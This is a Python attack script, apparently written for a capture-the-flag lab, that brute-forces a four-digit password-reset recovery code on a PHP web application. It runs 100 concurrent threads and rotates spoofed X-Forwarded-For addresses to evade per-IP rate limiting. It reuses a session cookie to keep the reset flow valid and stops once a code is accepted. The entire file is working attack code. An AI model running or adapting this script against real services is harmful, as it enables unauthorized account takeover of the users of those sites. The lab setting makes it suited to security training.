import requests
import random, ipaddress
from concurrent.futures import ThreadPoolExecutor, as_completed
import re, os

ip_address = "10.10.250.195" # <-- changes this
port = "1337"
email = "tester@hammer.thm"

base_url = f"http://{ip_address}:{port}"
reset_url = f"{base_url}/reset_password.php"

def generate_random_ip():
    while True:
        ip_int = random.randint(1, (1 << 32) - 1)
        ip = ipaddress.IPv4Address(ip_int)
        if not (ip.is_private or ip.is_loopback or ip.is_reserved or ip.is_multicast or ip.is_link_local):
            return str(ip)

# Recupera un nuovo PHPSESSID
def get_phpsessid():
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": base_url,
        "Referer": reset_url,
    }
    data = {"email": email}

    resp = session.post(reset_url, headers=headers, data=data, allow_redirects=False)
    if "Set-Cookie" in resp.headers:
        match = re.search(r"PHPSESSID=([^;]+);", resp.headers["Set-Cookie"])
        if match:
            return match.group(1)

    raise Exception("Cannot obtain a valid PHPSESSID")

# Funzione per inviare una richiesta
def send_request(code, phpsessid):

    x_forwarded_for = generate_random_ip()

    # print(f"\n[---> Random IP: {x_forwarded_for}")

    headers = {
        "Host": f"{ip_address}:{port}",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": base_url,
        "Connection": "keep-alive",
        "Referer": reset_url,
        "Upgrade-Insecure-Requests": "1",
        "Priority": "u=0, i",
        "X-Forwarded-For": x_forwarded_for,
        "Cookie": f"PHPSESSID={phpsessid}"
    }

    data = {
        "recovery_code": code,
        "s": "180"
    }

    try:
        resp = requests.post(reset_url, headers=headers, data=data, timeout=2)
        if "Invalid or expired recovery code!" not in resp.text:
            print(f"\n[+] Success! Toeken found: {code}")
            os._exit(1) #exit
    except requests.RequestException:
        pass

# Funzione generatrice dei codici
def generate_codes():
    for i in range(10000):
        yield f"{i:04}"


# Brute-force manager
def run_bruteforce():
    try:
        phpsessid = get_phpsessid()
        print(f"[+] Got a PHPSESSID: {phpsessid}")

        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = {
                executor.submit(send_request, code, phpsessid): code for code in generate_codes()
            }
            for future in as_completed(futures):
                future.result()
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    run_bruteforce()
